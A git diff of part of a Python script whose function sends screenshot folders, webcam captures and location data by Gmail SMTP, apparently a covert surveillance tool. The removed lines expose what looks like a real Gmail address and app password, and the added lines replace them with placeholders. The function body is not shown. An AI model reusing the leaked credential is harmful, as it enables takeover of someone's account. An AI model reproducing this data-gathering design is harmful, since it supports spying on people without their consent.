@@ -1,11 +1,11 @@
 import smtplib
 import os
 from email.message import EmailMessage
-from utils.geolocation import get_location  # fallback if GPS not provided
+from utils.geolocation import get_location  
 
 # 🔐 Set your Gmail credentials here
-EMAIL_ADDRESS = "kpunithnaik25@gmail.com"
-EMAIL_PASSWORD = "jssg nqkk nsqe tqfd"  # Use 16-digit Gmail app password
+EMAIL_ADDRESS = "your_emailaddress"
+EMAIL_PASSWORD = "Strong password content 16-digit"  
 
 def send_data_to_email(screenshot_folder, webcam_folder, location_info=None):
     try:
@@ -49,3 +49,4 @@ def send_data_to_email(screenshot_folder, webcam_folder, location_info=None):
 
     except Exception as e:
         print(f"[❌] Failed to send email: {e}")
+
